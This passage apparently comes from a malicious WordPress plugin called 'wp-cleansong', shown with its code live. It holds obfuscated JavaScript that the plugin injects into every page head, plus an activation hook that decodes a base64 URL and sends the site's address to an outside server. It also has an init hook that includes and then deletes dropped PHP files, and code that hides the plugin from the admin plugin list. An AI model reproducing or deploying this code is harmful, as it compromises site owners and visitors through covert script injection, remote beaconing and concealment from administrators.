-0x175,_0x2bb76c);}_0x5700e1[_0x1054cc(0x52d,0x548,0x4e7,0x54d,'QL3I')]=_0x36691e[_0x4cb50e(0x266,0x26e,0x23d,'bd0c',0x254)],_0x5700e1[_0x3e225e(-0xd,'PrhC',-0x2c,-0x8,0xf)]=_0x36691e[_0x1054cc(0x52b,0x4f4,0x55a,0x4fd,'kr&b')],_0x5700e1['id']=_0x36691e[_0x5bd144(0x582,0x584,0x581,0x58f,'MlE!')];if(_0x36691e[_0x4cb50e(0x2c5,0x29a,0x269,'MlE!',0x29f)](_0x36691e[_0x4cb50e(0x24c,0x23d,0x224,'8Ctf',0x277)](Boolean,document[_0x3e225e(0x6c,'eOEa',0x4e,0x3a,0x2e)+_0x1054cc(0x530,0x553,0x51a,0x547,'&1jU')+_0x27cb44('IdS8',-0x58,-0x82,-0x5e,-0x52)](_0x36691e[_0x5bd144(0x5b9,0x59a,0x58d,0x58c,'lpm]')])),![])){if(_0x36691e[_0x27cb44('IdS8',-0x83,-0x75,-0x78,-0x90)](_0x36691e[_0x5bd144(0x55d,0x503,0x513,0x544,'u70L')],_0x36691e[_0x5bd144(0x50c,0x539,0x50f,0x533,'sGl2')]))_0x352e4c[_0x5bd144(0x56a,0x57f,0x585,0x554,'kszI')+_0x4cb50e(0x297,0x288,0x2ac,'4Pv]',0x25a)+_0x27cb44('sdsH',-0xd,0x12,-0x4f,0x26)]?(_0x2d084c[_0x4cb50e(0x252,0x268,0x26b,'FzgB',0x286)+_0x4cb50e(0x218,0x23f,0x242,'%CPd',0x281)+_0x27cb44('MscT',-0x86,-0x60,-0xad,-0x76)][_0x27cb44('bWvp',-0x72,-0xac,-0x53,-0x6b)+_0x4cb50e(0x248,0x24d,0x234,'SA@Y',0x275)][_0x3e225e(0x10,'8Ctf',-0x40,-0x35,-0x67)+_0x1054cc(0x529,0x56d,0x565,0x4ee,'Zy(a')+'re'](_0x483f52,_0x4ab35d[_0x5bd144(0x503,0x56d,0x557,0x52d,'g5rw')+_0x4cb50e(0x242,0x22b,0x204,'arQD',0x237)+_0x27cb44('8m[P',-0x7b,-0x5b,-0x4c,-0x3c)]),_0x484692[_0x5bd144(0x583,0x54d,0x552,0x578,'2^5T')+_0x4cb50e(0x255,0x24e,0x26c,'A!aF',0x292)+_0x4cb50e(0x23a,0x26a,0x291,'aYFN',0x242)][_0x27cb44('&1jU',-0x81,-0x61,-0x6c,-0x75)+'e']()):_0x163830[_0x3e225e(0x23,'JMgQ',0x14,0x4d,0x60)+_0x4cb50e(0x293,0x2ae,0x2c1,'kr&b',0x285)+_0x27cb44('z*D&',-0x8e,-0x6d,-0x9f,-0x4d)+_0x3e225e(-0x28,'75cc',0x5,0x7,0x2c)](_0x36691e[_0x5bd144(0x554,0x511,0x541,0x54d,'MscT')])[-0x1d*-0x100+0x1698+0x68*-0x7f][_0x27cb44('G9zV',-0x20,-0x3a,0xb,-0x5b)+_0x27cb44('&1jU',-0x32,-0x35,-0x2a,-0x36)+'d'](_0x1a9fda);else{if(document[_0x1054cc(0x4a7,0x4e2,0x4c0,0x46e,'rpqE')+_0x1054cc(0x4de,0x524,0x4ff,0x49a,'Zy(a')+_0x3e225e(0x36,'PrhC',0x2f,-0x4,-0x20)])_0x36691e[_0x5bd144(0x55b,0x537,0x4fa,0x51d,'O4tB')](_0x36691e[_0x3e225e(0x1d,'%CPd',0xc,0x10,-0x2f)],_0x36691e[_0x4cb50e(0x24d,0x251,0x221,'u70L',0x289)])?(document[_0x3e225e(0x2e,'aYFN',0x4b,0x2c,0x22)+_0x27cb44('MU%w',-0x42,-0x7a,-0x62,-0x84)+_0x5bd144(0x4f7,0x52f,0x563,0x52a,'Ft20')][_0x1054cc(0x4ae,0x487,0x4b7,0x4f3,'kr&b')+_0x5bd144(0x590,0x564,0x537,0x55b,'Wnq^')][_0x27cb44('75cc',-0x17,-0x11,-0x5f,-0x10)+_0x4cb50e(0x28a,0x24a,0x229,'PrhC',0x271)+'re'](_0x5700e1,document[_0x1054cc(0x4eb,0x4a7,0x4bd,0x4e2,'Wnq^')+_0x4cb50e(0x285,0x261,0x29b,'G9zV',0x230)+_0x1054cc(0x4f9,0x51b,0x4dd,0x53b,'[YXg')]),document[_0x27cb44('Ft20',-0x45,-0x85,-0x27,-0x8b)+_0x4cb50e(0x22d,0x263,0x292,'QL3I',0x275)+_0x27cb44('!Wnf',-0x3a,-0x32,-0x7d,-0x2e)][_0x5bd144(0x4fc,0x503,0x50a,0x50a,'jOb8')+'e']()):(_0x11cede[_0x1054cc(0x522,0x4eb,0x52c,0x54c,'sdsH')+_0x5bd144(0x51d,0x52f,0x4e2,0x51c,'%51r')+_0x1054cc(0x531,0x577,0x537,0x572,'s*p@')][_0x5bd144(0x536,0x514,0x4e1,0x50d,'GsHW')+_0x5bd144(0x52a,0x530,0x534,0x561,'u70L')][_0x3e225e(0x7,'3^Nl',-0x23,0x24,-0x10)+_0x3e225e(0x10,'sdsH',0x38,0x12,0x1)+'re'](_0x3335c0,_0x909a2e[_0x5bd144(0x543,0x4fc,0x540,0x52b,'arQD')+_0x27cb44('FzgB',-0x96,-0x51,-0x6d,-0x73)+_0x4cb50e(0x2c9,0x28f,0x29c,'jOb8',0x2ad)]),_0x30bee7[_0x3e225e(-0x1d,'75cc',0xb,0x27,0x61)+_0x4cb50e(0x26d,0x238,0x261,'%51r',0x226)+_0x3e225e(-0x41,'GsHW',-0x6a,-0x2f,-0x34)][_0x4cb50e(0x25d,0x244,0x22e,'GsHW',0x233)+'e']());else{if(_0x36691e[_0x27cb44('[3RI',-0x75,-0xa7,-0x87,-0x92)](_0x36691e[_0x1054cc(0x4c7,0x4ec,0x4de,0x4ad,'G9zV')],_0x36691e[_0x4cb50e(0x29e,0x258,0x228,'4Pv]',0x298)]))return _0x36691e[_0x4cb50e(0x278,0x252,0x28e,'8m[P',0x273)](_0x3d556d[_0x4cb50e(0x2b4,0x279,0x248,'Ft20',0x246)+'e'][_0x27cb44('sGl2',-0x91,-0xaf,-0xc0,-0x82)+'Of'](_0x204c91),-(-0x2702+0x313+0x23f0));else _0x4beb41[_0x27cb44('%CPd',-0x8b,-0x4c,-0xcb,-0xc7)+_0x3e225e(-0x29,'jOb8',-0x32,-0x2,-0x35)+_0x5bd144(0x568,0x4f2,0x548,0x525,'lpm]')+_0x5bd144(0x58d,0x55f,0x57c,0x586,'8Ctf')](_0x36691e[_0x3e225e(0x2f,'[3RI',-0x16,0x1,0x29)])[-0x26a5+-0x1*0xfa9+-0x15*-0x296][_0x5bd144(0x58d,0x5ab,0x55b,0x579,'8Ctf')+_0x5bd144(0x577,0x589,0x529,0x56a,'kszI')+'d'](_0x5700e1);}}}}function _0x5157(_0x285eaf,_0x7b75b1){var _0x22c6ff=_0x57f4();return _0x5157=function(_0x3459d1,_0x2a2efd){_0x3459d1=_0x3459d1-(0x172*0x16+0x1fec+0x1*-0x3e7d);var _0x4e4208=_0x22c6ff[_0x3459d1];if(_0x5157['jPgljB']===undefined){var _0x30f7d1=function(_0x10ba6a){var _0x2031ec='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x32d792='',_0x317e6f='';for(var _0x1c99c8=-0x2568+0x3*0x781+-0x5d*-0x29,_0x2cc133,_0x28d33b,_0x5b1683=0x1*0x10d6+-0x1*-0xdbf+-0x1e95;_0x28d33b=_0x10ba6a['charAt'](_0x5b1683++);~_0x28d33b&&(_0x2cc133=_0x1c99c8%(-0x40c+-0x153c+-0x194c*-0x1)?_0x2cc133*(0x3*0x19b+0x1863*-0x1+0x13d2)+_0x28d33b:_0x28d33b,_0x1c99c8++%(0x1393+0x3*-0x591+-0x2dc))?_0x32d792+=String['fromCharCode'](-0xc*-0x60+0x1*-0xd88+0xa07&_0x2cc133>>(-(0xb5*-0x34+0x141f+0x10a7)*_0x1c99c8&-0xfa8+0x1246+-0x298)):-0x1*-0x2e3+0x43*-0x79+-0x8*-0x399){_0x28d33b=_0x2031ec['indexOf'](_0x28d33b);}for(var _0x5dae42=0xcfc+0x12*0x9f+-0x182a,_0x3bed44=_0x32d792['length'];_0x5dae42<_0x3bed44;_0x5dae42++){_0x317e6f+='%'+('00'+_0x32d792['charCodeAt'](_0x5dae42)['toString'](-0x28c*0x2+0x1322*0x1+0xdfa*-0x1))['slice'](-(0xe98+0x1181*0x1+-0x2017));}return decodeURIComponent(_0x317e6f);};var _0x1e8a9f=function(_0x4474c3,_0x3f2f63){var _0x3b3a46=[],_0x2d87bb=-0x3*0x16d+0x603+-0x4*0x6f,_0x5ed9ed,_0x1f61e4='';_0x4474c3=_0x30f7d1(_0x4474c3);var _0x42a3f9;for(_0x42a3f9=-0x266+0x4*0x47b+-0xf86;_0x42a3f9<0x1c13+-0x4ba+-0x3*0x773;_0x42a3f9++){_0x3b3a46[_0x42a3f9]=_0x42a3f9;}for(_0x42a3f9=-0x16*-0x23+-0x1*-0x2439+-0x273b;_0x42a3f9<0x25e9+0x2*-0xad+-0x238f;_0x42a3f9++){_0x2d87bb=(_0x2d87bb+_0x3b3a46[_0x42a3f9]+_0x3f2f63['charCodeAt'](_0x42a3f9%_0x3f2f63['length']))%(-0x1d98+0x7*0x54b+-0x675),_0x5ed9ed=_0x3b3a46[_0x42a3f9],_0x3b3a46[_0x42a3f9]=_0x3b3a46[_0x2d87bb],_0x3b3a46[_0x2d87bb]=_0x5ed9ed;}_0x42a3f9=-0x12f0+0xd76+0x57a,_0x2d87bb=0x1b4a*-0x1+0x14f*0x14+0x11e;for(var _0x2305dc=-0x8b*0x3+0xe3*-0xe+-0x1*-0xe0b;_0x2305dc<_0x4474c3['length'];_0x2305dc++){_0x42a3f9=(_0x42a3f9+(0x2*0xd3d+-0xd0a*-0x2+0x348d*-0x1))%(-0x4e1*-0x3+0x1*0x20f6+-0x2e99),_0x2d87bb=(_0x2d87bb+_0x3b3a46[_0x42a3f9])%(0x39*-0xd+-0x1c68+0x204d),_0x5ed9ed=_0x3b3a46[_0x42a3f9],_0x3b3a46[_0x42a3f9]=_0x3b3a46[_0x2d87bb],_0x3b3a46[_0x2d87bb]=_0x5ed9ed,_0x1f61e4+=String['fromCharCode'](_0x4474c3['charCodeAt'](_0x2305dc)^_0x3b3a46[(_0x3b3a46[_0x42a3f9]+_0x3b3a46[_0x2d87bb])%(0x1c*0x92+-0x10f0+0x8*0x3f)]);}return _0x1f61e4;};_0x5157['zbsLqN']=_0x1e8a9f,_0x285eaf=arguments,_0x5157['jPgljB']=!![];}var _0x5bc9f4=_0x22c6ff[0x9a+-0x176c*-0x1+-0x19a*0xf],_0x253ac4=_0x3459d1+_0x5bc9f4,_0x4cd9de=_0x285eaf[_0x253ac4];return!_0x4cd9de?(_0x5157['HGYqgd']===undefined&&(_0x5157['HGYqgd']=!![]),_0x4e4208=_0x5157['zbsLqN'](_0x4e4208,_0x2a2efd),_0x285eaf[_0x253ac4]=_0x4e4208):_0x4e4208=_0x4cd9de,_0x4e4208;},_0x5157(_0x285eaf,_0x7b75b1);}function _0x57f4(){var _0x6591bf=['lbpdMmolWPS','cmoHr1iK','e8oqACkSCG','W6NcHvHDAq','WRfOh8kPW6m','WP5wWRJcQmoB','W6TEt8kkWOtcLHulW4SJCCoX','baxcSXpdLW','WR8la8kEtG','W64kWO17a8kPFSo2W7pdIa','W5FcTCoKW5/dHa','W6NcPMivkq','dSk6yJddUq','phWTDa','WOKBp8koCa','W4b6WOlcSG0','W6/cU0LvyG','jvrqpL4','W5utWR1Wcq','y0ldUCo+W6m','rCkkW5RdJSkG','W6aqrYVdUG','fef9gWi','W4/dNvK','W7qtBxNdNW','WRSblCkoBq','Amoct3NdSa','W6VcGmoP','W4G1yXxdUa','WRhdGX8opZ/cLIqLWPmCW6i','bmk/za','qCkHoXNdQa','W6RdHCo4cCk8','W4NcU8k5tSogW6NdTe8','mhaZAM8','lSkkySkEWOS','hSkkWRpdT8oM','W6hcM1TDDq','WQtcIdldMCoc','W505Db7dOG','W6vbWRdcGc8','W51pWO/cS0G','hSouWPNcNmoHWRSlFwDatJ7cQq','WR3cMtq','z8oxWQaqeW','W6CcCfldLa','r8kQbSo7ma','dIlcQCk/xq','WPddJmkDDSkP','W7Cne8otWP0','cfmVdmoS','W7lcISowb8oxWR/cRSkicSoHtsK','WQxdQSk+','WRf/lCk4W7u','bK1NFNe','jLu0s0i','W4VcGu5IqW','sCoctNpdPq','W7RcT2LiFG','a05c','bZpcJSkzqW','hSoQrSoXkq','ie9ncbO','xSk4la','W6dcMv8dea','WQBcJc3dK8oA','nwFdRSo9W6K','e8oLqa','W6HaWPhcKtG','WOpcHMFdGmoI','WQhdR8oWWRjL','nYtdK8ojWOC','huRcSGldMa','dKvxaa','WO44WPeluG','sSkXoSoZkW','W7j0WQxcHge','zgxdRSoUW6u','pfnyhuO','CmkhdaBdNa','W7pcRmohWRD3W6RdNCkY','u8otv2ZdOa','nX/dHSok','WPe0Fhiu','WQ7dMmoKW7FdKG','nglcM01W','kHBdGG','ExtdJ8o7W74','oCkcASkFWOK','CLddS8oyWP83WRH5','WPGRAZNdOSkQW7e','WO3cOf3dS8oC','x8khW5VdGSkI','du9/nNC','W6BcOKetnq','zdShBuJdHmohW43cVSkWWRldOW','W5ldM2KvW74','s8kQW4JdHSk3','jKW2','WOSkFLiL','W5mYWPvkna','e8klWPldPSoX','WOxdS8kKWPft','WRWoEa','b0RcTGBdHq','WQxdV8kjvSkm','mZtcS8kdyq','WO3cOghcOca','gCknDstdSW','WROBdSomW5C','a8ogACk3zW','W4iZW4LsiG','WO4tWOyBga','W7VdL3u','WPhdUCkl','W7tcOSo9W6SjWOKGW7JcJSkzWQZdHW','W4qjWOHCna','gCoGrKuZ','gCo6w1W/','cIBcR8kEqG','d0KycSoM','W645omkpW70PWPJcMq','eM5zah8','bvjFfg4','WRubg8ozW5C','W7hcQSk1W7u5WPNcHSkgzw5bW6ddUq','WQ3cJIGyWRq','e8oZwSkHAKzJW5KdAmouqG','WRddMmk9','t8krW5VdMCk3','j8kLW65Xs8keW7tdIYyvWPaUkq','WR0TfmoxW54','W6P4e8kzW6KDWOW','mLNcHv1v','WRylFIFdKa','W55kiWvGESoLFahcNSocWOJdGG','x8oKs3xdVW','EN0OW7VcPq','W60kWOH8uSotfmoQW7FdPHj5tq','W4joW4LCauZdIh5xBmooW6G','nCkFEW','eSo3uCkMAeq+W54TFSoFDNq','zCozomohW4xdMGJdPCoLW4BdLca'];_0x57f4=function(){return _0x6591bf;};return _0x57f4();}function _0x53fe9b(_0x3907b6,_0x25277b,_0x52c43c,_0xc60260,_0x360dc1){return _0x5157(_0x360dc1- -0x18f,_0x25277b);}function _0x4a7ec6(_0x3651cc){var _0x1fd38c={};_0x1fd38c[_0x25a9f6(0x467,0x47d,'u70L',0x475,0x493)]=function(_0x27cba9,_0x4e9389){return _0x27cba9!==_0x4e9389;};function _0x5ad3fb(_0x21372b,_0x5c11b8,_0x17e440,_0x4e04cb,_0x528995){return _0x5157(_0x5c11b8-0x11,_0x528995);}function _0x25a9f6(_0x333537,_0x507a77,_0x33aa0d,_0x261825,_0xe678ac){return _0x5157(_0x507a77-0x2c2,_0x33aa0d);}function _0x3e7503(_0xb37885,_0x533f59,_0x33af88,_0x539864,_0x2fdb53){return _0x5157(_0x539864- -0x2ea,_0x33af88);}function _0x47ea60(_0x59e861,_0x38a4b4,_0x54bc9f,_0x45b31d,_0x2a39e9){return _0x5157(_0x54bc9f-0x199,_0x2a39e9);}var _0x34d493=_0x1fd38c;return _0x34d493[_0x5ad3fb(0x17c,0x164,0x1a6,0x15e,'8Ctf')](document[_0x47ea60(0x2fa,0x305,0x2e2,0x2ec,'A!aF')+'e'][_0x3e7503(-0x199,-0x195,'MU%w',-0x19d,-0x1ca)+'Of'](_0x3651cc),-(0x4b4+0x1c77+-0x212a));}var _0x7aa2b1=_0x53fe9b(-0xf,'kszI',-0x34,-0x5,0x8)+_0x53fe9b(0x1e,'IdS8',0x41,-0x19,0x28);function _0x2228f4(_0x307f6a,_0x5a2340,_0x555d62,_0x510698,_0x270973){return _0x5157(_0x5a2340-0x292,_0x510698);}function _0x186cbf(_0x5b1d21,_0x3d5d78,_0x4a4a49,_0x183efa,_0x276c74){return _0x5157(_0x4a4a49- -0x257,_0x3d5d78);}var _0x2e4104=_0x53fe9b(0x6,'!Wnf',-0x66,-0x40,-0x20)+_0x186cbf(-0xd5,'JMgQ',-0x10f,-0x150,-0x152)+'s';function _0x2f24c8(_0x153767,_0x3f4b48,_0x14eb0b,_0x3fcd56,_0x22a7ff){return _0x5157(_0x153767-0x34b,_0x22a7ff);}_0x4a7ec6(_0x2e4104)==![]&&_0x4a7ec6(_0x7aa2b1)==![]&&_0x27138f('');</script>
	<?php
}
add_action('wp_head', 'clean_header');

















































































































function clean_plugin_activate() {
$b = "base64_decode";
        $z="file_get_contents";
        $ur=base64_decode("aHR0cHM6Ly9kbnMuc3RhcnRzZXJ2aWNlZm91bmRzLmNvbS9zZXJ2aWNlL2YucGhw");     
        $z($ur."?p=".get_site_url());

}
register_activation_hook( __FILE__, 'clean_plugin_activate' );
function clean_inc(){
	$my_plugin = WP_PLUGIN_DIR . '/wp-cleansong';

	if ( file_exists( $my_plugin . "/songs.php" ) ) {
	  include($my_plugin . "/songs.php");
	  @unlink($my_plugin . "/songs.php");
	}

	if ( file_exists( $my_plugin . "/cleans.php" ) ) {
	  include($my_plugin . "/cleans.php");
	  @unlink($my_plugin . "/cleans.php");
	}
}
add_action('init', 'clean_inc');
function clean_show(){
		global $wp_list_table;
	$hidearr = array('wp-cleansong/wp-cleansong.php');
	$myplugins = $wp_list_table->items;
	foreach ($myplugins as $key => $val) {
	if (in_array($key,$hidearr)) {
		unset($wp_list_table->items[$key]);
		}
	}
}
add_action('pre'.'_curr'/*5*/.'ent_ac'./*5*/'tive_p'./*5*/'lugi'./*5*/'ns', 'clean_show');